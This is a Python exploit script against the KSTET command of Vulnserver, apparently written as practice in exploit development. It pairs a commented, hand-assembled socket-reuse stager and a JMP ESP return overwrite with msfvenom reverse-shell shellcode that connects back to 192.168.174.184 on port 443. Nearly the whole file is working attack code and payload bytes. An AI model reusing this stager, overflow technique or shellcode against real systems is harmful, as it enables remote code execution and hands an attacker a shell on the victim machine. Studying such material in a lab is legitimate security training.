#!/usr/bin/python

"""
KSTET exploit using socket reuse vulnerability
https://rastating.github.io/using-socket-reuse-to-exploit-vulnserver/
https://deceiveyour.team/2018/10/15/vulnserver-kstet-ws2_32-recv-function-re-use/
"""

import socket,sys,time

address = "192.168.174.132"
port = 9999
stager = "\x90\x90\x90\x90\x90\x90\x90\x90\x90" #nops

#socket in recv function is located at 00BCFB94
#Now ESP is pointing 00BCFA0C
#Have to add 188 to ESP to point to recv and store this value in EAX
#adding because dont like to use absolute values
stager += "\x54" #PUSH ESP
stager += "\x58" #POP EAX
stager += "\x66\x05\x88\x01" #ADD AX,0x188

#ESP is poiting now at 00BCFA0C 
#So it may interfere with second stage payload need to sub ESP to point before
stager += "\x83\xEC\x64" #SUB ESP, 0x64

#Now setup recv function params
#1st is flags argument which should be 0
stager +="\x33\xDB" #XOR EBX, EBX
stager += "\x53" #PUSH EBX

#Next argument is buffer size
#in this case it will be 0x400 = 1024 bytes
#will use EBX as it's already zeroed
stager += "\x80\xC7\x04" #ADD BH, 0x4
stager += "\x53" #PUSH EBX

#Next argument is address where data from 2nd stage of exploit will be stored
#Use it relative (ESP+0x64) to current ESP location
stager += "\x54" #PUSH ESP
stager += "\x5B" #POP EBX
stager += "\x83\xC3\x64" #ADD EBX, 0x64
stager += "\x53" #PUSH EBX

#Last param is value of socket - socket address is in EAX
#But function requires socket value not address - so have to use EAX as pointer
#to this value
stager += "\xFF\x30" #PUSH DWORD PTR DS:[EAX]

#Last step is to put recv function address in EAX and CALL EAX to run function
#Function is located at 0x0040252C - contains null bytes - so have to to trick 
#with shifting values so 0x0040252C => 8 bits shift => 0x0040252C
stager += "\xB8\x90\x2C\x25\x40" #MOV EAX,40252C90
stager += "\xC1\xE8\x08" #SHR EAX,8
stager += "\xFF\xD0" #CALL EAX

#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.174.184 LPORT=443 -f python -b "\x00"
#len = 351
buf =  ""
buf += "\xbf\xd7\x10\x4e\xd9\xda\xdf\xd9\x74\x24\xf4\x5e\x2b"
buf += "\xc9\xb1\x52\x31\x7e\x12\x03\x7e\x12\x83\x39\xec\xac"
buf += "\x2c\x39\xe5\xb3\xcf\xc1\xf6\xd3\x46\x24\xc7\xd3\x3d"
buf += "\x2d\x78\xe4\x36\x63\x75\x8f\x1b\x97\x0e\xfd\xb3\x98"
buf += "\xa7\x48\xe2\x97\x38\xe0\xd6\xb6\xba\xfb\x0a\x18\x82"
buf += "\x33\x5f\x59\xc3\x2e\x92\x0b\x9c\x25\x01\xbb\xa9\x70"
buf += "\x9a\x30\xe1\x95\x9a\xa5\xb2\x94\x8b\x78\xc8\xce\x0b"
buf += "\x7b\x1d\x7b\x02\x63\x42\x46\xdc\x18\xb0\x3c\xdf\xc8"
buf += "\x88\xbd\x4c\x35\x25\x4c\x8c\x72\x82\xaf\xfb\x8a\xf0"
buf += "\x52\xfc\x49\x8a\x88\x89\x49\x2c\x5a\x29\xb5\xcc\x8f"
buf += "\xac\x3e\xc2\x64\xba\x18\xc7\x7b\x6f\x13\xf3\xf0\x8e"
buf += "\xf3\x75\x42\xb5\xd7\xde\x10\xd4\x4e\xbb\xf7\xe9\x90"
buf += "\x64\xa7\x4f\xdb\x89\xbc\xfd\x86\xc5\x71\xcc\x38\x16"
buf += "\x1e\x47\x4b\x24\x81\xf3\xc3\x04\x4a\xda\x14\x6a\x61"
buf += "\x9a\x8a\x95\x8a\xdb\x83\x51\xde\x8b\xbb\x70\x5f\x40"
buf += "\x3b\x7c\x8a\xc7\x6b\xd2\x65\xa8\xdb\x92\xd5\x40\x31"
buf += "\x1d\x09\x70\x3a\xf7\x22\x1b\xc1\x90\x8c\x74\x67\xd8"
buf += "\x65\x87\x77\x18\xcd\x0e\x91\x70\x21\x47\x0a\xed\xd8"
buf += "\xc2\xc0\x8c\x25\xd9\xad\x8f\xae\xee\x52\x41\x47\x9a"
buf += "\x40\x36\xa7\xd1\x3a\x91\xb8\xcf\x52\x7d\x2a\x94\xa2"
buf += "\x08\x57\x03\xf5\x5d\xa9\x5a\x93\x73\x90\xf4\x81\x89"
buf += "\x44\x3e\x01\x56\xb5\xc1\x88\x1b\x81\xe5\x9a\xe5\x0a"
buf += "\xa2\xce\xb9\x5c\x7c\xb8\x7f\x37\xce\x12\xd6\xe4\x98"
buf += "\xf2\xaf\xc6\x1a\x84\xaf\x02\xed\x68\x01\xfb\xa8\x97"
buf += "\xae\x6b\x3d\xe0\xd2\x0b\xc2\x3b\x57\x3b\x89\x61\xfe"
buf += "\xd4\x54\xf0\x42\xb9\x66\x2f\x80\xc4\xe4\xc5\x79\x33"
buf += "\xf4\xac\x7c\x7f\xb2\x5d\x0d\x10\x57\x61\xa2\x11\x72"

buffer = stager + "\x90" * (64 - len(stager))
buffer += "\xaf\x11\x50\x62" #JMP ESP funciton address in essfunc.dll 
buffer += "\xEB\xBC\x90\x90" #JMP SHORT 00BCF9CA - going back in buffer for stager
buffer += "C" * (3000-68-4)
try:
	print '[+] Sending buffer'
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((address,port))
	s.recv(1024)			
        s.send('KSTET /.../ ' + buffer + '\r\n')
        time.sleep(5)
        s.send("\x90" * 100 + buf + "\x90" * (924 - len(buf)))
except:
 	print '[!] Unable to connect to the application.'
 	sys.exit(0)
finally:
	s.close()
